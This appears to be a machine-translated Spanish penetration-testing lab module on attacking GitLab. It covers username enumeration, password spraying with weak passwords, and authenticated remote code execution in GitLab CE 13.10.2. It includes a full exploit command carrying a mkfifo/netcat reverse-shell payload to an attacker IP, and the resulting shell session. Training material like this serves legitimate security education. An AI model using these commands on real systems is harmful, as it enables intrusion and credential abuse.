# Attacking GitLab

Como vimos en la sección anterior, incluso el acceso no autenticado a una instancia de GitLab podría conducir a un compromiso de datos confidenciales. Si pudiéramos obtener acceso como un usuario o administrador de la empresa válido, podríamos descubrir suficientes datos para comprometer completamente a la organización de alguna manera. Gitlab tiene[553 CVES](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html)reportado a partir de septiembre de 2021. Si bien no todos son explotables, ha habido varios severos a lo largo de los años que podrían conducir a la ejecución de código remoto.

---

# **Enumeración del nombre de usuario**

Aunque no se considera una vulnerabilidad por Gitlab como se ve en su[Hackerone](https://hackerone.com/gitlab?type=team)Página ("La enumeración del usuario y del proyecto/divulgación de ruta a menos que se pueda demostrar un impacto adicional"), todavía es algo que vale la pena verificar, ya que podría dar lugar al acceso si los usuarios seleccionan contraseñas débiles. Podemos hacer esto manualmente, por supuesto, pero los guiones hacen que nuestro trabajo sea mucho más rápido. Podemos escribir uno nosotros mismos en Bash o Python o usar[Éste](https://www.exploit-db.com/exploits/49821)para enumerar una lista de usuarios válidos. Se puede encontrar la versión python3 de esta misma herramienta[aquí](https://github.com/dpgg101/GitLabUserEnum). Al igual que con cualquier tipo de ataque de pulverización de contraseña, debemos tener en cuenta el bloqueo de la cuenta y otros tipos de interrupciones. Los valores predeterminados de GitLab se establecen en 10 intentos fallidos que dan como resultado un desbloqueo automático después de 10 minutos. Esto se puede ver[aquí](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb). Esto se puede cambiar, pero Gitlab tendría que ser compilado por la fuente. En este momento, no hay forma de cambiar esta configuración desde la interfaz de usuario de administración, pero un administrador puede modificar la longitud mínima de contraseña, lo que podría ayudar con los usuarios a elegir contraseñas cortas y comunes, pero no mitigarán por completo el riesgo de ataques de contraseña.

Atacando a Gitlab

```
# Number of authentication tries before locking an account if lock_strategy# is failed attempts.config.maximum_attempts = 10

# Time interval to unlock the account if :time is enabled as unlock_strategy.config.unlock_in = 10.minutes

```

Descargando el script y ejecutarlo contra la instancia de GitLab de destino, vemos que hay dos nombres de usuario válidos,`root`(la cuenta de administración incorporada) y`bob`. Si retiramos con éxito una gran lista de usuarios, podríamos intentar un ataque de pulverización de contraseña controlada con contraseñas débiles y comunes como`Welcome1`o`Password123`, etc., o intente reutilizar las credenciales recopiladas de otras fuentes, como los volcados de contraseña de las infracciones de datos públicos.

Atacando a Gitlab

```
xnoxos@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302

```

---

# **Ejecución de código remoto autenticado**

Las vulnerabilidades de ejecución del código remoto generalmente se consideran la "crema del cultivo", ya que el acceso al servidor subyacente probablemente nos otorgará acceso a todos los datos que reside en él (aunque es posible que debamos escalar los privilegios primero) y puede servir como un punto de apoyo en la red para que podamos lanzar más ataques contra otros sistemas y potencialmente resultar en una compromiso de red completa. GitLab Community Edition versión 13.10.2 y Lower sufrió una ejecución de código remoto autenticado[vulnerabilidad](https://hackerone.com/reports/1154542)Debido a un problema con los metadatos de manejo de ExifTool en archivos de imagen cargados. Este problema fue solucionado por Gitlab con bastante rapidez, pero algunas compañías aún pueden usar una versión vulnerable. Podemos usar esto[explotar](https://www.exploit-db.com/exploits/49951)Para lograr RCE.

Como esta es la ejecución de código remoto autenticado, primero necesitamos un nombre de usuario y contraseña válidos. En algunos casos, esto solo funcionaría si pudiéramos obtener credenciales válidas a través de OSINT o un ataque de adivinanzas de credencial. Sin embargo, si nos encontramos con una versión vulnerable de GitLab que permite el autoinscripción, podemos registrarnos rápidamente para una cuenta y lograr el ataque.

Atacando a Gitlab

```
xnoxos@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '[1] Authenticating
Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
[+] RCE Triggered !!

```

Y obtenemos un caparazón casi al instante.

Atacando a Gitlab

```
xnoxos@htb[/htb]$ nc -lnvp 8443listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ idid
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ lsls
VERSION
config.toml
flag_gitlab.txt
sockets
```